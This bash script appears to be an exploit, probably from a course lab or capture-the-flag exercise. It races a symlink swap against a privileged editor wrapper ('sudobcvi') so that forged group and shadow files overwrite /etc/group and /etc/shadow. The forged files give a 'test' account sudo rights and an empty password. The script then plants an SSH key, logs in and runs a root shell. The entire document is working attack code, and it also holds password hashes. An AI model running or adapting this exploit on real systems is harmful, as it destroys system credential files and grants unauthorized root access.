#!/bin/bash

echo "root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,smcc,student,seoh,test
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:smcc
floppy:x:25:
tape:x:26:
sudo:x:27:smcc,student,seoh,test
audio:x:29:
dip:x:30:smcc
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:smcc
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
input:x:106:
crontab:x:107:
syslog:x:108:
netdev:x:109:
lxd:x:110:smcc,student,seoh
messagebus:x:111:
uuidd:x:112:
mlocate:x:113:
ssh:x:114:
smcc:x:1000:
lpadmin:x:115:smcc
sambashare:x:116:smcc
student:x:1001:
test:x:1002:
seoh:x:1003:
shutdown:x:1004:" > group

echo "root:!:17401:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
lxd:*:17401:0:99999:7:::
messagebus:*:17401:0:99999:7:::
uuidd:*:17401:0:99999:7:::
dnsmasq:*:17401:0:99999:7:::
sshd:*:17401:0:99999:7:::
smcc:$6$oDFEFzhw$aJouZSXVTM2uqA8qADTCuz64zh320Lz5h3w2JgIpCOQfsBQMIUfx7fTTyJz3/l2RxKHFQa8H/LaNkdNW9bWgJ/:17401:0:99999:7:::
student:$6$n8ddGiiW$zwbs0a2x.WOMZK85OZhxjaBhbNerFmGjJ5yOquFLv0GHF3i7gR1.yENrMFvctEVd2yF6zo.0EXKBBxszHCOn/1:17422:0:99999:7:::
test::17421:0:99999:7:::
seoh:*:17421:0:99999:7:::
shutdown:*:17421:0:99999:7:::" > shadow

echo "#!/bin/bash

ln -sf /etc/group test" > testsym

chmod 755 testsym

echo "#!/usr/bin/expect
set timeout 20
spawn sudobcvi test
set bcviID \$spawn_id
expect \"Hello\"
sleep 5
spawn \"./testsym\"
set symID \$spawn_id
sleep 5
close -i \$symID
send -i \$bcviID \":w\r\"
send -i \$bcviID \":q\r\"
interact -i \$bcviID" > expecttest

chmod 755 expecttest

ln -sf group test

./expecttest

echo "#!/bin/bash

ln -sf /etc/shadow test" > testsym

chmod 755 testsym

ln -sf shadow test

sleep 1

./expecttest

echo "#!/usr/bin/expect
spawn ssh-keygen -t rsa
expect \"Enter file\"
send \"\r\"
expect \"Enter passphrase\"
send \"\r\"
expect \"Enter same\"
send \"\r\"
interact" > sshkey

chmod 755 sshkey
./sshkey
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
chmod og-wx ~/.ssh/authorized_keys

echo "#!/usr/bin/expect
spawn ssh test@localhost
expect \"Are you sure\"
send \"yes\r\"
expect \"~$\"
send \"sudo /bin/rootshell\r\"
interact" > ssh

chmod 755 ssh
./ssh

